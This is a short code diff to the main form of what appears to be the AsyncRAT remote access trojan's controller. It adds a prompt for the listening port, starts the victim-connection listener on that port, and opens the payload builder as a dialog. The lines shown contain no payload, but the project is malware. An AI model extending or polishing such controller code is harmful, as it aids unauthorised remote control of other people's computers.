@@ -22,6 +22,7 @@ namespace AsyncRAT_Sharp
 
     public partial class Form1 : Form
     {
+        private static Builder builder = new Builder();
         public Form1()
         {
             InitializeComponent();
@@ -30,9 +31,13 @@ namespace AsyncRAT_Sharp
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Text = $"{Settings.Version} // NYAN CAT";
+            var input = Interaction.InputBox("", "Select Port", "6606",-1,-1);
+            if (string.IsNullOrWhiteSpace(input)) Environment.Exit(0);
+            Settings.Port = Convert.ToInt32(input);
 
+            Text = $"{Settings.Version} // NYAN CAT";
             Listener listener = new Listener();
+
             Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
             thread.Start(Settings.Port);
         }
@@ -344,8 +349,7 @@ namespace AsyncRAT_Sharp
 
         private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            Builder builder = new Builder();
-            builder.Show();
+            builder.ShowDialog();
         }
     }
 }
